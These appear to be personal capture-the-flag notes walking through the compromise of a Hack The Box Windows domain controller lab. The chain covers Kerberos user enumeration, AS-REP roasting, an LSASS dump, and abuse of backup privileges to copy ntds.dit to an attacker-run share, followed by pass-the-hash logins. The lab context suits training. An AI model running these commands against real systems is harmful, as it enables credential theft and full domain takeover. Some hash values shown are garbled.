```bash
sudo nmap -sC -sV -oA nmap/blackfield 10.10.10.192
```

- `-sC` for default scripts
    
- `-sV` to enumerate all versions
    
- `-oA` to output all formats

### /etc/hosts Update

Add the following to `/etc/hosts`:

```plaintext
10.10.10.192 BLACKFIELD.local BLACKFIELD
```

### RPC Client Access

Trying out **rpcclient** since this is an Active Directory machine:

```bash
rpcclient 10.10.10.192
```

No access.

Trying with null authentication:

```bash
rpcclient 10.10.10.192 -U ''
```

This works.

Running `enumdomusers`:

```bash
rpcclient $> enumdomusers
```

Access denied.


### SMB Client Enumeration

Testing **smbclient** to list shares:

```bash
smbclient -L 10.10.10.192
smbclient -L 10.10.10.192 -U ''
```

Trying with **crackmapexec** to list available shares and permissions:

```bash
cme smb 10.10.10.192 --shares
cme smb 10.10.10.192 --shares -u ''
cme smb 10.10.10.192 --shares -u '' -p ''
cme smb 10.10.10.192 --shares -u 'PleaseSub'
cme smb 10.10.10.192 --shares -u 'PleaseSub' -p ''
```

### Mounting the `profiles$` Share

Enumerating the `profiles$` share:

```bash
smbclient '//10.10.10.192/profiles$'
```

**Findings:** Lots of user directories.

Mounting the share locally:

```bash
sudo mount -t cifs '//10.10.10.192/profiles$' /mnt -o user=""
```

Navigate into the mount point:

```bash
cd /mnt
ls -la
```

Finding all files and directories recursively:

```bash
find .
```

Use #kerbrute [[Kerbrute]] to enumerate valid usernames

GitHub:

https://github.com/ropnop/kerbrute

```bash
kerbrute -h
```


```bash
./kerbrute userenum --dc 10.10.10.192 -d blackfield -o kerbrute.username.out users.lst
```

![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250109185104.png)
Found three valid usernames. Save these to a file.

![[Pasted image 20250109185234.png]]

Use [[Impacket]] #getnpusers to perform #ASREProast


```bash
./GetNPUsers.py -dc-ip 10.10.10.192 -no-pass -userfile users.lst blackfield/
```

Got a hash 

![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250109190751.png)
Crack this hash with #hashcat 

Figure out hashcat mode quickly:

```
./hashcat --example-hashes | grep krb5asrep
```

```
./hashcat --example-hashes | grep -B5 krb5asrep
```

Need mode `18200`

![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250109201559.png)

Crack the hash. 

```
./hashcat -m 18200 hashes/blackfield /opt/wordlist/rockyou.txt
```

![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250109201716.png)

When hashcat is done..use `--show` flag

```
./hashcat -m 18200 hashes/blackfield --show
```

![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250109201827.png)

Password is: `#00^Blackknight`

Use these new creds with #crackmapexec 

```
cme smb 10.10.10.192 --shares -u support -p '#00^Blackknight'
```

![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250109202117.png)


Trying to connect with #rpcclient again

```
rpcclient -U support 10.10.10.192
```

![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250109202457.png)
Run 
```
enumdomusers
```

![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250109202534.png)
Lots of users. Create a new users file. 

Cleanup this new `tmp` file with 

```
cat tmp | awk -F'\[' '{print $1}'
```

```
cat tmp | awk -F'\[' '{print $2}'
```

```
cat tmp | awk -F'\[' '{print $2}' | awk -F '\]' '{print $1}' > users.lst
```

Run #getnpusers again 

```
GetNPUsers.py -dc-ip 10.10.10.192 -no-pass -usersfile users.lst blackfield/
```

![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250109203114.png)
No new hashes.

Run #pythonbloodhoundingestor 

https://github.com/dirkjanm/BloodHound.py

Running into issues so going to edit `/etc/resolv.conf`

![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250109203720.png)
Deleted stuff from `/etc/hosts`

```
python3 bloodhound.py -u support -p '#00^Blackknight' -ns 10.10.10.192 -d blackfield.local -c all
```

![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250109203952.png]]
Got some `.json` files from this. 

Start #neo4j 

```
sudo neo4j console
```

Execute Bloodhound and login to console

`./Bloodhound` 

Drag files from `bloodhound.py` execution into the console. 

Mark `support` user as pwn3d. 

Go to queries..

`Find all domain admins` (just one)

`Shortest path to domain admins` (none)

Set this user as high value target 

![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250109204722.png]]

Set `audit2020`, `svc.backup` as high value targets 

The click `Shortest Path to High Value Targets`

Looks insane. 

![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250109204917.png]]
Look for shortest path to `audit2020` user 

![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250109205031.png)
Discover the `support` user can change `audit2020`'s password without knowing that user's current password. 

![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250109205215.png)
Change this user's password from linux with #rpcclient 

```
rpcclient -U support 10.10.10.192
```

Set the password with 

`setuserinfo2 Audit2020 23 'PleaseSub'`

![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250109205719.png]]
It failed tho because password was not complex enough.

```
setuserinfo2 Audit2020 23 'PleaseSub!'
```

Test it out with #crackmapexec 

```
cme smb 10.10.10.192 -u Audit2020 -p 'PleaseSub!'
```

![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250109205908.png]]

Check shares and we can read the forensic / audit share now. 

```
cme smb 10.10.10.192 -u Audit2020 -p 'PleaseSub!' --shares
```

![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250109210028.png]]

Ensure stuff is unmounted with

```
sudo umount /mnt
```

```
sudo mount -t cifs -o 'username=audit2020,password=PleaseSub!' //10.10.10.192/forensic /mnt
```

![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250109210237.png]]
```
cd /mnt
```

```
ls -la
```

![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250109210308.png]]
Look through these directories

`cd memory_analysis`

`ls -la`

`lsass.zip` file is interesting. 

![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250109210517.png]]
lsass is where mimikatz pulls plaintext passwords. 

Search for the lsass dump tool [[pypykatz]]

https://github.com/skelsec/pypykatz

It's maybe in pip repository.

```
pip3 install pypykatz
```

Unzip `lsass.zip` to get `lsass.DMP` file

Finding flags to use with pypykatz and lsa

```
pypykatz lsa -h
```

![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110190623.png]]
Running `pypykatz lsa minidump lsass.DMP > lsass.out`

![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110190750.png]]

`less lsass.out` to go through it. 

Find `svc_backup` user and an NT hash.

![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110191140.png]]
Grab all the NT hashes with `grep NT lsass.out -B3 | grep -i username `

![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110191315.png]]
Grab NT hashes for `svc_backup` and `administrator` and pop into credentials file. 

![[Pasted image 20250110191447.png]]
Try #crackmapexec with administrator's NT hash. 

`cme smb 10.10.10.192 -u administrator -H 7fle4ff8c6a8e6b6fcae2d9c0572cd62 `

![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110191643.png]]

It fails. 

Trying other user

```
cme smb 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110191756.png]]

This works but no pwn3d.

Use #evilwinrm to login. 

```
evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110191933.png]]

Running `whoami /all` and discover we have some dangerous privileges:

`SeBackupPrivilege` and `SeRestorePrivilege`

![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110200246.png]]
SeBackupPrivilege:

* Save things out of the registry
* Read files you normally couldn't access
* Restore files 
* Members of "Backup Operators" can logon locally on DC & backup ntds.dit ex. with "wbadmin.exe" or "diskshadow.exe"

![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110200617.png]]
Use #impacket #smbserver to set up a share on attacker box.

```
sudo smbserver.py -smb2support -user ippsec -password PleaseSubscribe SendMeYoData $ (pwd)
```

![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110201022.png]]

Access this local share from remote win-rm shell 

```
net use x: \\10.10.14.2\SendMeYoData /user: ippsec PleaseSubscribe
```

![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110201148.png]]

Now get wbadmin to send the ntds backup file to our impacket share. 

```
wbadmin start backup -backuptarget:\\10.10.14.2\SendMeYoData -include:c: \windows\ntds\
```

![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110201423.png]]
If there's a logon prompt for [Y] or [N] can echo y into prompt like 

```
echo y | wbadmin start backup -backuptarget:\\10.10.14.2\SendMeYoData -include:c: \windows\ntds\
```

![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110201724.png]]
This fails because it wants an NTFS folder. 
![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110201821.png]]
Create an NTFS folder:

```
dd if=/dev/zero of=ntfs.disk bs=1024M count=2
```
![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110202001.png]]

```
sudo losetup -fP ntfs.disk
```

Check mount with 

```
losetup -a
```

![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110202212.png]]

```
sudo mkfs.ntfs /dev/loop0
```

![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110202259.png]]

```
sudo mount /dev/loop0 smb/
```

```
mount | grep smb
```

![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110202412.png]]

Re-running impacket command. 

```
sudo smbserver.py -smb2support -user ippsec -password PleaseSubscribe SendMeYoData $ (pwd)
```

Re-running wbadmin command:

```
echo y | wbadmin start backup -backuptarget:\\10.10.14.2\SendMeYoData -include:c: \windows\ntds\
```

This fails again because impacket doesn't handle ntfs well. 

Editing samba to create a windows fileshare from linux

`vi /etc/samba/smb.conf`
![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110203054.png]]

Restart smbd

`sudo systemctl restart smbd`

![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110203411.png]]

From evil-winrm, mount to the share

`net use x: \\10.10.14.2\SendMeYoData`

![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110203304.png]]

Now trying the wbadmin command AGAIN

`echo y | wbadmin start backup -backuptarget:\\10.10.14.2\SendMeYoData -include:c: \windows\ntds\`

`WindowsImageBackup` directory is created on attack box. SUCCESS.

![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110203655.png]]
Use wbadmin to restore a ntds.dit out of our backup and creating a backup of the SYSTEM Registry hive

`echo Y wbadmin start recovery -version:????? -itemtype:file -items:C: windows\ntds\ntds.dit - recoverytarget:C: -notrestoreacl`

![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110203958.png]]

get versions by running:

`wbadmin get versions`

![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110204110.png]]

`10/02/2020-03:51`

![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110204208.png]]

Execute this on evil-winrm

`echo Y wbadmin start recovery -version:10/02/2020-03:51 -itemtype:file -items:C: windows\ntds\ntds.dit - recoverytarget:C: -notrestoreacl`

![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110204324.png]]

Got `ntds.dit` ! Download it to attack box.

![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110204408.png]]
Save and download the reg keys

`reg save hklm\system system.hive`

`download system.hive`

![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110204640.png]]
Now we can run #impacket #secretsdump 

(without history)
`secretsdump.py -ntds ntds.dit -system system.hive LOCAL`

![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110205058.png]]


(with history)
`secretsdump.py -ntds ntds.dit -system system.hive -history LOCAL`

![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110205137.png]]
We got admin's hash so can use #psexec with this hash.

`psexec.py -hashes 184fb5e5178480be64824H4cd53b99ee:184fb5e5178480be64824H4cd53b99ee administrator@10.10.10.192`

![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110205419.png]]

Can't grab the flag as SYSTEM user due to EFS (Encrypted File System). Using WMIExec to get a shell as the actual user

Use #wmiexec

```
wmiexec.py -hashes 184fb5e5178480be64824H4cd53b99ee:184fb5e5178480be64824H4cd53b99ee administrator@10.10.10.192
```

Using Mimikatz to restore the password of Audit2020, so it's like we were never there.

![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110205816.png]]
